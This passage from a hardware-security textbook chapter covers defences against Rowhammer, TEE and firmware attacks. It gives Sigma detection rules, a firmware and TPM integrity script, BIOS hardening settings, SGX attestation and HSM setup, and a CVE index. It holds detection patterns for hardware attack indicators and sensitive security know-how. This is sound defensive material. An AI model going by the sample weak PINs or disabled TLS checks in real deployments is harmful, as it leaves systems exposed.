**Note on DDR5 ODECC blindness.** On DDR5 systems with on-die ECC (§6.3), single-bit Rowhammer flips are corrected inside the DRAM chip and never increment the EDAC CE counter. This monitoring rule is effective only on DDR4 with system-level ECC or on DDR5 when multi-bit flips exceed ODECC capacity (which triggers system-level UE counters). DDR5 Rowhammer detection requires alternative methods: monitoring RFM command rates (if exposed by the memory controller driver) or using the Intel MLC (Memory Latency Checker) tool to detect abnormal memory access latency patterns indicative of sustained hammering.

### 7.3 TEE attestation failure alerting

**Rule 5: TEE attestation failure rate monitoring.**

```yaml
title: Elevated TEE Attestation Failure Rate
id: b2c3d4e5-f6a7-8901-bcde-f23456789012
status: experimental
logsource:
    category: application
    product: attestation_service
detection:
    selection:
        EventType: 'attestation_verification'
        Result: 'failure'
    condition: selection | count() by SourceIP > 5
    timeframe: 300s
level: high
tags: [ attack.credential_access, attack.t1556 ]
description: >
    Detects rapid attestation failures from a single source, indicative of
    enclave enumeration, TCB downgrade probing, or quote replay attempts.
    Normal attestation failures are rare (<1/hour per client); >5 in 5 minutes
    suggests active probing.
falsepositives: [ Misconfigured client during deployment, TCB recovery rollout ]
```

**Rule 6: Hardware debug interface activation.**

```yaml
title: Hardware Debug Interface Activation Detected
id: c3d4e5f6-a7b8-9012-cdef-345678901234
status: experimental
logsource:
    category: system
    product: linux
detection:
    selection_jtag:
        EventType: 'kernel'
        Message|contains:
            - 'JTAG'
            - 'Intel DCI'
            - 'ARM CoreSight'
    selection_dci:
        # Intel Direct Connect Interface — hardware debugger
        EventType: 'dmesg'
        Message|contains: 'DCI detected'
    condition: selection_jtag or selection_dci
level: critical
tags: [ attack.credential_access, attack.t1552 ]
description: >
    Hardware debug interfaces (JTAG, Intel DCI, ARM CoreSight DAP) provide
    unrestricted access to CPU state, memory, and TEE contents. Activation
    in production is either a configuration error or an active hardware attack.
falsepositives: [ Manufacturing test, authorized hardware debug session ]
```

### 7.4 Hardware integrity verification

**Rule 7: Firmware hash comparison.**

```bash
#!/bin/bash
# firmware_integrity_check.sh — compare running firmware hashes against known-good baseline
# Run weekly via cron; alert on mismatch

BASELINE="/etc/security/firmware_baseline.json"
REPORT="/var/log/firmware_audit_$(date -u +%Y%m%d).json"

check_microcode() {
    CURRENT=$(grep -m1 'microcode' /proc/cpuinfo | awk '{print $NF}')
    EXPECTED=$(jq -r '.microcode' "$BASELINE")
    if [ "$CURRENT" != "$EXPECTED" ]; then
        echo "MISMATCH: microcode current=$CURRENT expected=$EXPECTED"
        return 1
    fi
    return 0
}

check_uefi_secureboot() {
    SB_STATE=$(od -An -t u1 \
        /sys/firmware/efi/efivars/SecureBoot-8be4df61-93ca-11d2-aa0d-00e098032b8c \
        2>/dev/null | awk '{print $NF}')
    EXPECTED=$(jq -r '.secureboot' "$BASELINE")
    if [ "$SB_STATE" != "$EXPECTED" ]; then
        echo "MISMATCH: SecureBoot state=$SB_STATE expected=$EXPECTED"
        return 1
    fi
    return 0
}

check_tpm_pcrs() {
    if command -v tpm2_pcrread &>/dev/null; then
        # Compare PCR 0 (CRTM/BIOS), PCR 7 (SecureBoot policy)
        for pcr in 0 7; do
            CURRENT=$(tpm2_pcrread sha256:${pcr} -Q -o /dev/stdout | xxd -p)
            EXPECTED=$(jq -r ".pcr_sha256_${pcr}" "$BASELINE")
            if [ "$CURRENT" != "$EXPECTED" ]; then
                echo "MISMATCH: PCR${pcr} current=${CURRENT:0:16}... expected=${EXPECTED:0:16}..."
                return 1
            fi
        done
    fi
    return 0
}

ERRORS=0
echo "{\"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\", \"checks\": [" > "$REPORT"

for check in check_microcode check_uefi_secureboot check_tpm_pcrs; do
    RESULT=$($check 2>&1)
    STATUS=$?
    echo "  {\"check\": \"$check\", \"status\": $STATUS, \"detail\": \"$RESULT\"}," >> "$REPORT"
    [ $STATUS -ne 0 ] && ERRORS=$((ERRORS + 1))
done

echo "]}" >> "$REPORT"
[ $ERRORS -gt 0 ] && logger -t firmware_audit -p auth.crit \
    "ALERT: $ERRORS firmware integrity mismatches — see $REPORT"
```

**Rule 8: TPM PCR validation for boot integrity.**

The firmware integrity script above includes TPM PCR validation. PCR 0 measures the CRTM (Core Root of Trust for Measurement) and BIOS code; any change indicates firmware modification. PCR 7 measures the Secure Boot policy; a change indicates Secure Boot was disabled or the key database was modified. In production environments, combine this with a remote attestation flow: the server sends TPM quotes (signed PCR values) to a centralized verifier that compares against the expected baseline. This catches firmware-level rootkits (e.g., LoJax, CosmicStrand, BlackLotus) that modify UEFI firmware to persist across OS reinstalls.

### 7.5 Supply chain hardware verification

**Component authentication.** Modern server platforms support component authentication protocols:

- **SPDM (Security Protocol and Data Model, DMTF).** Standardized protocol for authenticating PCIe devices, storage controllers, and network cards. Each device presents a certificate chain rooted in the manufacturer's CA; the host verifies the chain before enabling the device. SPDM 1.2+ supports measurement reporting (the device reports its firmware hash), enabling firmware attestation at the device level.

- **Intel Platform Firmware Resilience (PFR).** An FPGA-based Root of Trust (Cerberus-class) on the motherboard that monitors and authenticates all firmware updates to the BIOS, BMC, and ME. PFR blocks unauthorized firmware modifications and can recover from corrupted firmware by restoring a known-good image. PFR verification status is available via BMC IPMI commands.

```bash
# SPDM device attestation (using spdm-emu or libspdm CLI)
# Verify PCIe device identity and firmware measurement
spdm_requester_emu --pcap spdm_trace.pcap \
    --req_cert_chain \
    --req_meas_all \
    --transport_type pci_doe \
    --device_id 0000:03:00.0

# PFR status check (Intel Whitley/Eagle Stream platforms)
ipmitool raw 0x3e 0x1a  # OEM command: PFR state
# Expected: 0x00 = provisioned and active
```

---

## 8. Hardware security hardening

This section provides operational hardening guidance beyond the BIOS settings and kernel parameters in §4F. Focus is on TEE infrastructure, memory configuration, and HSM deployment.

### 8.1 BIOS/UEFI settings for Rowhammer mitigation

Building on the settings table in §4F.1, the following BIOS options directly affect Rowhammer resilience:

| Setting | Location (typical) | Recommended Value | Effect |
|---------|-------------------|-------------------|--------|
| Memory Refresh Rate | Advanced → Memory Configuration | 1x or 2x (halved tREFI) | Reduces Rowhammer attack window by 2× |
| Target Row Refresh (TRR) | Advanced → Memory Configuration | Enabled | DRAM-internal mitigation (bypassable but raises bar) |
| ECC Mode | Advanced → Memory Configuration | SDDC or Chipkill | Corrects single-device failures |
| Memory Scrubbing | Advanced → Memory Configuration | Enabled, 24h period | Proactive correction of latent errors |
| Patrol Scrub Interval | Advanced → Memory Configuration | 1-4 hours | More frequent than default 24h reduces flip accumulation |
| DDR5 RFM | Advanced → Memory Configuration | Enabled | Controller-driven refresh management |
| Memory Interleaving | Advanced → Memory Configuration | Channel interleaving ON | Spreads activations across channels |

**Refresh rate tuning.** The standard tREFI of 7.8 μs (64 ms full-array refresh) can be halved to 3.9 μs (32 ms full-array) via BIOS settings on server platforms (Dell iDRAC: "Memory Operating Mode" → "Reliability" includes doubled refresh). This halves the Rowhammer attack window but reduces effective memory bandwidth by ~2-5% (more time spent refreshing). For security-critical deployments handling multi-tenant workloads, the bandwidth tradeoff is justified.

### 8.2 SGX sealing key management best practices

SGX sealing keys (§1.5) are platform-bound and TCB-version-bound. Key management requires operational procedures for key rotation, data migration, and platform decommissioning.

**Sealing policy selection.** Use MRSIGNER-based sealing (not MRENCLAVE) for long-lived data. MRENCLAVE-based sealing ties data to a specific binary hash — any code update (even a bug fix) generates a new MRENCLAVE, rendering previously sealed data inaccessible. MRSIGNER-based sealing ties data to the signer's key, allowing code updates without data re-sealing. The tradeoff: MRSIGNER-based sealing allows any enclave signed by the same key to unseal the data, so compromise of the signing key allows unauthorized unsealing.

**TCB recovery procedure.** When Intel releases a microcode update that increments the TCB version (addressing a security vulnerability), sealing keys change. The recovery procedure:

1. Before applying the microcode update, run the enclave on the old TCB level and unseal all persistent data.
2. Export the unsealed data via an attested secure channel (TLS with mutual attestation) to a migration service.
3. Apply the microcode update (reboot).
4. Run the enclave on the new TCB level, import the data via the attested channel, and re-seal with the new TCB's sealing key.
5. Verify that the re-sealed data is accessible on the new TCB level.
6. Securely delete the migration service's copy of the plaintext.

**Key hierarchy recommendation.** Do not seal application data directly with the platform sealing key. Instead, use the sealing key to protect a key-encryption key (KEK), which in turn wraps application data keys. This adds a level of indirection that simplifies rotation: on TCB recovery, only the KEK needs re-sealing; application data (encrypted under the data key, which is wrapped by the KEK) does not need re-encryption.

### 8.3 TEE attestation infrastructure deployment

Deploying DCAP attestation for SGX or TDX in production requires several infrastructure components.

**Intel Provisioning Certification Caching Service (PCCS).** In data-center deployments, each TDX/SGX platform fetches PCK certificates and collateral from Intel's Provisioning Certification Service (PCS). Running a local PCCS cache eliminates the runtime dependency on Intel's external service.

```bash
# Deploy PCCS (Intel DCAP reference implementation)
sudo apt install sgx-dcap-pccs
# Configure /opt/intel/sgx-dcap-pccs/config/default.json:
# - ApiKey: register at Intel's provisioning portal to obtain
# - hosts: "0.0.0.0" for network access
# - HTTPS: configure TLS certificate
sudo systemctl enable --now pccs

# Verify PCCS is operational
curl -k https://localhost:8081/sgx/certification/v4/rootcacrl
# Expected: DER-encoded CRL (non-empty response)

# Register platform with PCCS
PCKIDRetrievalTool -f pckid_retrieval.csv
# Upload platform data to PCCS
curl -k -X POST https://localhost:8081/sgx/certification/v4/platforms \
    -H "Content-Type: application/json" \
    -d @pckid_retrieval.csv
```

**Collateral refresh.** PCCS collateral (TCB Info, QE Identity, CRL) expires and must be refreshed periodically. Set a cron job to pull updated collateral:

```bash
# /etc/cron.daily/pccs-refresh
#!/bin/bash
curl -k https://localhost:8081/sgx/certification/v4/refresh \
    -X PUT -H "admin-token: $(cat /etc/pccs/admin_token)" \
    >> /var/log/pccs_refresh.log 2>&1
```

**Attestation verification policy.** Define a minimum TCB level that your verifier accepts. Reject quotes from platforms with outdated microcode (indicating unpatched CVEs):

```python
# attestation_policy.py — example DCAP quote verification policy
MINIMUM_TCB = {
    "sgxtcbcomp01svn": 14,   # Minimum component SVN (post-Downfall fix)
    "sgxtcbcomp02svn": 14,
    "pcesvn": 13,
}

ALLOWED_MRENCLAVES = {
    # SHA-256 of authorized enclave binaries
    bytes.fromhex("a1b2c3d4..."),  # production enclave v3.2.1
    bytes.fromhex("e5f6a7b8..."),  # production enclave v3.2.0 (grace period)
}

def verify_quote(quote):
    """Returns (bool, str) — (accepted, reason)."""
    if quote.tcb_level < MINIMUM_TCB:
        return False, f"TCB level {quote.tcb_level} below minimum {MINIMUM_TCB}"
    if quote.mrenclave not in ALLOWED_MRENCLAVES:
        return False, f"MRENCLAVE {quote.mrenclave.hex()} not in allowlist"
    if quote.attributes.debug:
        return False, "Debug enclave rejected in production"
    return True, "Quote accepted"
```

### 8.4 Memory configuration hardening

**ECC enforcement.** On server platforms, ECC is typically enabled by default. Verify explicitly:

```bash
# Verify ECC is active
sudo dmidecode -t memory | grep -E 'Error Correction|Total Width|Data Width'
# ECC present: Total Width > Data Width (e.g., 72 bits vs. 64 bits)
# Non-ECC: Total Width == Data Width

# Verify EDAC driver is loaded and detecting the memory controller
lsmod | grep edac
ls /sys/devices/system/edac/mc/mc0/
```

**Memory scrubbing configuration.** Patrol scrubbing (background ECC scrubbing of all memory) corrects latent single-bit errors before they accumulate into multi-bit failures. Configure via BIOS or (on some platforms) via the memory controller driver:

```bash
# Check current patrol scrub interval (Intel Xeon)
# Via BIOS: Advanced → Memory Configuration → Patrol Scrub → Enabled
# Via ipmitool (Dell/Lenovo/HPE):
ipmitool raw 0x30 0x63  # OEM-specific; check vendor documentation

# rasdaemon: monitor scrubbing-related events
sudo rasdaemon --foreground --record 2>&1 | grep -i scrub
```

### 8.5 Hardware security module deployment for key protection

HSMs provide FIPS 140-2/3 validated key storage and cryptographic operations, protecting keys even if the host OS is compromised. For environments where TEE-based key protection is insufficient (e.g., regulatory requirements, or when the TEE's threat model does not match the deployment's risk profile), HSM integration is the standard approach.

**Network HSM integration pattern (PKCS#11).**

```bash
# Configure SoftHSM for development/testing (production: use Thales Luna, Utimaco, AWS CloudHSM)
sudo apt install softhsm2 libengine-pkcs11-openssl
softhsm2-util --init-token --slot 0 --label "keystore" --pin 1234 --so-pin 5678

# Generate RSA key inside HSM
pkcs11-tool --module /usr/lib/softhsm/libsofthsm2.so \
    --login --pin 1234 \
    --keypairgen --key-type rsa:4096 \
    --id 01 --label "tls-key"

# Use HSM-stored key with OpenSSL (PKCS#11 engine)
openssl req -engine pkcs11 -keyform engine \
    -key "pkcs11:token=keystore;id=%01;type=private;pin-value=1234" \
    -new -x509 -days 365 -out cert.pem \
    -subj "/CN=hsm-protected-service"

# Nginx with HSM-backed TLS key
# In nginx.conf:
# ssl_engine pkcs11;
# ssl_certificate_key "engine:pkcs11:pkcs11:token=keystore;id=%01;type=private";
```

**HSM key lifecycle.** Production HSM deployments require:

1. **Key ceremony.** Generate master keys on the HSM with M-of-N quorum (e.g., 3-of-5 smart cards). Record the ceremony with audit witnesses and timestamps.
2. **Key backup.** HSM-to-HSM key replication via the vendor's secure backup mechanism (e.g., Thales Luna's cloning, AWS CloudHSM's cross-region backup). Never export private keys in cleartext.
3. **Key rotation.** Define rotation schedules per key type: TLS keys every 1-2 years, signing keys per release cycle, encryption keys per regulatory requirement (PCI DSS: annual rotation for KEKs).
4. **Decommissioning.** HSM zeroization on end-of-life: vendor-specific secure erase command that overwrites all key material and resets the HSM to factory state. Verify via the HSM's audit log.

**HSM vs. TEE decision matrix:**

| Factor | HSM | SGX/TDX Enclave | SEV-SNP VM |
|--------|-----|-----------------|------------|
| FIPS 140-2/3 validated | Yes (Level 3+) | No (Level 1 only) | No |
| Tamper resistance | Physical (Level 3+) | Side-channel dependent | Hypervisor-dependent |
| Performance | Low (100-10K ops/sec) | High (near-native) | High (near-native) |
| Cost | $5K-$50K per unit | Included in CPU | Included in CPU |
| Key export | Never (by design) | Sealing key exports | VM snapshot risk |
| Regulatory acceptance | Established | Emerging | Emerging |

For most deployments, the optimal architecture combines TEE-based processing (high-throughput computation on sensitive data) with HSM-based key storage (keys never leave the HSM; the TEE requests cryptographic operations via PKCS#11 or KMIP). This provides both performance and regulatory compliance.

---

## 9. Cross-references

**To Chapter 7A:** All Spectre variants are prerequisite reading for the SGX side-channel attacks (§1.4) — MDS, L1TF, and TAA are extensions of the speculative-execution model to enclave-specific targets. The cache side-channel primitives (FLUSH+RELOAD, PRIME+PROBE) described in Chapter 7A §7 are the observation mechanisms used by both general Spectre attacks and the SGX-specific attacks in §1.4.2. The timing mechanics (`rdtsc`/`rdtscp`) from Chapter 7A §9 underlie the DRAMA DRAM-address reverse-engineering technique (§2.3).

**To Domain 2:** Page-table manipulation (Chapter 2A §10) is the mechanism behind L1TF (manipulating PTEs with present=0, §1.4.3) and Rowhammer PTE exploitation (§2.6). The `mmap`/huge-page mechanics (Chapter 2A §7, §11) are relevant to Rowhammer (huge-page allocation for contiguous physical memory, §2.3) and SMASH (§2.5). KPTI (Chapter 2A §10.3) is the Meltdown mitigation.

**To Domain 5:** Kernel mitigations (Chapter 5A §7) include SMEP/SMAP, KASLR, and KPTI — all of which interact with speculative-execution attacks. The kernel's `arch/x86/kernel/cpu/bugs.c` manages the runtime configuration of all speculative-execution mitigations, including the `VERW`-based MDS clearing (§1.4.4), L1D flush (§1.4.3), and IBPB/IBRS settings. The `sysfs` vulnerability reporting interface (§4) is maintained by this file.

**To Domain 6:** Spectre-class side channels are an alternative ASLR/KASLR bypass path (Chapter 6 §1.3, §6). The defense-in-depth analysis (Chapter 6 §8) should account for hardware-level attacks: even a perfectly-hardened software stack is vulnerable to Rowhammer-based page-table corruption (§2.6), Zenbleed register leakage (§3.3), Downfall vector-register sampling (§3.4), or GhostRace speculative race conditions (§3.8) from a co-located attacker.

**To this chapter's sections.** The SGX attestation model (§1.3) is undermined by SGAxe (§1.4.7). The controlled-channel attack (§1.4.1) and cache-timing attack (§1.4.2) techniques are the building blocks for the L1TF exploitation procedure (§1.4.3). The MDS-class attacks (§1.4.4, §1.4.5) all use the same `VERW`-based clearing mitigation. Rowhammer's ECC bypass (§2.9, ECCploit) and TRR evasion (§2.4, §2.5) demonstrate that no single defense is sufficient — defense-in-depth (ECC + TRR + increased refresh + RFM) is required.

---

## 10. Vulnerability timeline and CVE index

For quick reference, the following table maps the attacks discussed in this chapter to their CVE identifiers, disclosure dates, and affected vendors:

| Attack | CVE(s) | Disclosed | Vendor(s) | Section |
|--------|--------|-----------|-----------|---------|
| Rowhammer (original) | CVE-2015-0565 | 2015-03 | DRAM (all) | §2.7 |
| Drammer | CVE-2016-6728 | 2016-10 | ARM/Android | §2.7 |
| L1TF / Foreshadow | CVE-2018-3615/3620/3646 | 2018-08 | Intel | §1.4.3 |
| MDS (ZombieLoad/RIDL/Fallout) | CVE-2018-12126/12127/12130, CVE-2019-11091 | 2019-05 | Intel | §1.4.4 |
| TAA | CVE-2019-11135 | 2019-11 | Intel | §1.4.5 |
| Plundervolt | CVE-2019-11157 | 2019-12 | Intel (SGX) | §1.4.6 |
| RAMBleed | CVE-2019-0174 | 2019-06 | DRAM (all) | §2.7 |
| CacheOut | CVE-2020-0549 | 2020-01 | Intel | §1.4.9 |
| PLATYPUS | CVE-2020-8694/8695 | 2020-11 | Intel | §3.1 |
| ÆPIC Leak | CVE-2022-21233 | 2022-08 | Intel | §1.4.8 |
| Hertzbleed | CVE-2022-23823/24436 | 2022-06 | Intel, AMD | §3.2 |
| Downfall / GDS | CVE-2022-40982 | 2023-08 | Intel | §3.4 |
| Zenbleed | CVE-2023-20593 | 2023-07 | AMD (Zen 2) | §3.3 |
| Inception | CVE-2023-20569 | 2023-08 | AMD (Zen 1-4) | §3.5 |
| Reptar | CVE-2023-23583 | 2023-11 | Intel | §3.6 |
| RFDS | CVE-2023-28746 | 2024-03 | Intel (Atom) | §3.7 |
| GhostRace | CVE-2024-2193 | 2024-03 | Intel, AMD, ARM | §3.8 |
